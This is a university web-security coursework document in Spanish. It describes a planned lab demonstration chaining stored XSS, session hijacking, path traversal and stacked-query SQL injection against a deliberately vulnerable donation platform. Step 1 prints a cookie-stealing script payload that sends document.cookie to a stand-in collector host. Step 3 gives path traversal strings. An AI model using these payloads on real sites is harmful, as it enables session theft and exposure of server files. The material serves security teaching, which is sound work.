# Seguridad de Aplicaciones Web

**Ingeniería en Sistemas de Información**  
**Año 2026**

## Trabajo Práctico Cuatrimestral

### Entrega Parcial

**GRUPO N° 2**

| Apellido y Nombres | Dirección de E-Mail |
| --- | --- |
| Hidalgo, Mora Sofia | mohidalgo@frba.utn.edu.ar |
| Gobbi, Micaela Nicole | mgobbi@frba.utn.edu.ar |
| Molina, Nicolás Ariel | nchaveromolina@frba.utn.edu.ar |
| Affre, Lucas | laffre@frba.utn.edu.ar |

**Universidad Tecnológica Nacional**  
**Facultad Regional Buenos Aires**

---

# Plataforma de Donaciones Comunitarias

## Objetivo de la Demostración

Ejecutar una cadena de ataque completa (*Kill Chain*) explotando 4 vulnerabilidades concatenadas de OWASP Top 10, culminando en el desvío total de los fondos de la plataforma.

## Contexto

Una plataforma para gestionar donaciones, donde hay usuarios que tienen dinero cargado en la plataforma y pueden donar un monto aportando a distintas causas.

## Roles de la Demostración

Para el laboratorio en vivo, se utilizarán dos navegadores o perfiles distintos para representar las vistas:

| Rol | Descripción |
| --- | --- |
| **Atacante** | Usuario registrado estándar (ej. `martin`) operando desde un navegador. |
| **Víctima (Administrador)** | Usuario con máximos privilegios (`admin`) operando desde otro navegador. |

---

# Flujo de la Cadena de Ataque (Kill Chain)

## Paso 1: Infección Inicial (Injection / Stored XSS)

### Objetivo

Plantar un script malicioso en la plataforma que se ejecute en el navegador de otros usuarios.

### Acción del Atacante

1. Inicia sesión como usuario normal.
2. Navega a una petición popular (ej. "Jornada comunitaria para limpiar el Riachuelo").
3. En la sección de comentarios, inserta el siguiente payload que simula el robo de cookies hacia un servidor controlado por el atacante:

```html
<script>fetch('http://127.0.0.1:9000/log?cookie=' + document.cookie)</script>
```

4. Envía el comentario.

### Impacto Visual

El comentario malicioso queda almacenado en la base de datos (*Stored XSS*). A simple vista en el frontend, el script es invisible.

---

## Paso 2: Secuestro de Sesión (Identification and Authentication Failures)

### Objetivo

Escalar privilegios a Administrador sin conocer sus credenciales.

### Acción de la Víctima (Admin)

1. El administrador inicia sesión para moderar la plataforma.
2. Ingresa a la petición del "Riachuelo" para revisar la actividad reciente.

### La Ejecución

Al renderizarse la página, el navegador del Admin ejecuta el script oculto del Paso 1. Como la cookie de sesión no tiene el flag `HttpOnly`, el script logra leer `document.cookie` y enviarla al servidor del atacante.

### Acción del Atacante

1. Recibe el token de sesión del administrador en su consola.
2. Abre las herramientas de desarrollador en su navegador (`F12 > Almacenamiento > Cookies`) y reemplaza su propio token de sesión por el robado.
3. Recarga la página. Ahora tiene acceso al botón y panel de `/admin`.

---

## Paso 3: Reconocimiento Interno (Security Misconfiguration / Path Traversal)

### Objetivo

Entender la arquitectura del sistema para preparar un ataque financiero preciso.

### Acción del Atacante (como Admin)

1. En el panel de administrador, identifica la funcionalidad legítima de "Descarga de Logs de Actividad".
2. Intercepta la petición de descarga (o modifica la URL directamente) alterando el parámetro `?file=activity.log`.
3. Inyecta el payload de *Path Traversal* para forzar el retroceso de directorios en el servidor de archivos.

### Fuga de Información en Logs

El atacante descarga intencionalmente un log de errores del sistema:

```text
?file=errors.log
```

El log revela un *Traceback* detallado de excepciones del framework que expone rutas absolutas del servidor (ej. `var/www/app/main.py`).

La firma visual de las excepciones, las cabeceras del servidor y la estructura de los errores exponen explícitamente el uso de Python en el backend.

### Impacto Visual

Con las rutas absolutas confirmadas, el atacante modifica el parámetro a:

```text
?file=../../var/www/app/main.py
```

y descarga el código fuente completo.

### Descubrimiento Clave

Al inspeccionar el archivo `main.py`, descubre un endpoint heredado y oculto:

```text
/api/v2/legacy_mark_reviewed_77x9a
```

que interactúa con la base de datos mediante la función insegura `executescript()` de SQLite.

---

## Paso 4: Desvío de Fondos (Injection / Stacked Queries SQLi)

### Objetivo

Desviar los fondos de las donaciones de los usuarios para poder asignar el dinero a una cuenta asociada al atacante.

### Acción del Atacante

1. El atacante abre una herramienta de pruebas de APIs como Postman para interactuar manualmente con el endpoint oculto en Python:

```text
/api/v2/legacy_mark_reviewed_77x9a
```

2. Durante el análisis del backend, identifica que el parámetro `petition_id` es concatenado directamente dentro de una llamada a `executescript()` de SQLite sin utilizar consultas parametrizadas.

3. Aprovechando esta vulnerabilidad, el atacante realiza pruebas de SQL Injection para explorar la estructura de la base de datos e identificar tablas sensibles relacionadas con usuarios, balances y cuentas bancarias.

4. Una vez identificada la lógica financiera del sistema, prepara una inyección SQL estructurada utilizando consultas apiladas (*Stacked Queries*) para modificar registros críticos asociados a las campañas y sus destinatarios financieros.

5. El payload malicioso enviado en la petición `POST` permite ejecutar múltiples sentencias SQL consecutivas dentro de la misma transacción, alterando los datos persistidos por la aplicación.

### La Ejecución en Base de Datos

La función `executescript()` rompe la restricción habitual de SQLite —que normalmente impide múltiples comandos por consulta— y procesa cada sentencia separada por punto y coma (`;`) de manera secuencial.

El motor SQLite ejecuta primero la consulta legítima asociada al identificador enviado y, a continuación, procesa las instrucciones maliciosas inyectadas por el atacante.

Como resultado, los registros financieros de las campañas quedan modificados directamente en la base de datos, permitiendo cambiar aliases bancarios, cuentas receptoras o asociaciones de beneficiarios sin autorización.

La ausencia de validación de entradas y el uso inseguro de consultas dinámicas permiten que el atacante obtenga control total sobre la lógica de asignación de fondos de la plataforma.

### Impacto Visual Final

- Los balances internos quedan alterados.
- Las asociaciones financieras dejan de ser confiables.
- La integridad contable del sistema queda completamente comprometida.
- El sistema queda completamente comprometido.
